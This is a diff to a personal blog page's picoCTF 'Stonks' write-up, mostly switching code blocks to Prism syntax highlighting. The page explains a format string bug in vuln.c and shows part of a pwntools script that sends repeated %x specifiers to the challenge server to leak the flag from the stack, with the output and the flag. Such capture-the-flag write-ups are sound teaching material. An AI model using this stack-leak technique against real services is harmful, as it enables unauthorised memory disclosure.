@@ -15,6 +15,7 @@
 
     <!-- Theme CSS -->
     <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/prism.css">
 </head>
 <body class="theme-bg-light">
 
@@ -33,7 +34,7 @@
 
                 <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
                 <ul class="social-list list-inline py-3 mx-auto">
-                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://twitter.com/Abraxus7331" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
                     <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
                 </ul><!--//social-list-->
@@ -73,7 +74,7 @@
 <p>Comments: I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 53437</p>
 <h2 id="write-up">Write up:</h2>
 <p>Looking through vuln.c we find an interesting function:</p>
-<div class="lang-python editor-colors">int buy_stonks(Portfolio *p) {
+<pre><code class="language-python">int buy_stonks(Portfolio *p) {
 	if (!p) {
 		return 1;
 	}
@@ -111,11 +112,10 @@
 	view_portfolio(p);
 
 	return 0;
-}
-</div>
+}</code></pre>
 <p>This function reads the flag onto the stack and then asks the user to enter input before printing it using printf. Based on this we know that this is a format string vulnerability and that we want to read off of the stack.</p>
 <p>I then wrote the following script to connect to the server and send lots of %x (prints stack) before reading and parsing that to ascii:</p>
-<div class="lang-python editor-colors"># import pwntools
+<pre><code class="language-python"># import pwntools
 from pwn import *
 
 # string to write to
@@ -151,16 +151,12 @@ for i in x.split('-'):
 				s += chr(b)
 
 # print string
-print(s)
-</div>
+print(s)</code></pre>
 <p>When run this program prints:</p>
-<pre><code>Opening connection to mercury.picoctf.net on port 53437: Done
-M!MpicoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}@$0E@x%Eo
-</code></pre>
+<pre><code class="language-text">Opening connection to mercury.picoctf.net on port 53437: Done
+M!MpicoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}@$0E@x%Eo</code></pre>
 <p>And the flag was:</p>
-<pre><code>picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
-</code></pre>
-
+<pre><code class="language-text">picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}</code></pre>
         </article>
 
         <footer class="footer text-left py-2 theme-bg-dark">
@@ -173,5 +169,6 @@ M!MpicoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}@$0E@x%Eo
     <!-- Javascript -->
     <script src="../../assets/js/popper.min.js"></script>
     <script src="../../assets/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/prism.js"></script>
 </body>
 </html>
